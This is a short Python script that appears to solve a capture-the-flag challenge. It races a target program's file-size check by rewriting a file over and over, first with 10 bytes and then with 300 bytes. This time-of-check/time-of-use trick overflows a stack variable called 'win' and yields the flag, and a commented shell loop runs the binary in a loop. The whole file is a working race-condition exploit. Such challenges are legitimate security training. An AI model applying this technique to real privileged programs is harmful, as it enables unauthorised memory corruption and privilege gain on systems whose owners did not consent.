import os

# while true; do ./3.1 x | grep pwn; done 2>/dev/null

"""
Theres a check to see if the contents of the file its bigger than 256.
We trick the challenge by creating a file with 10 B's and quickly
replacing the file with 300 A's, thus overflowing the 'win' variable
in the stack and getting the flag.
"""

while True:
    os.unlink("x")
    file_descriptor = os.open("x", os.O_WRONLY|os.O_CREAT)
    os.write(file_descriptor, b'B'*10)
    os.close(file_descriptor)
    file_descriptor = os.open("x", os.O_WRONLY|os.O_CREAT)
    os.write(file_descriptor, b'A'*300)
    os.close(file_descriptor)
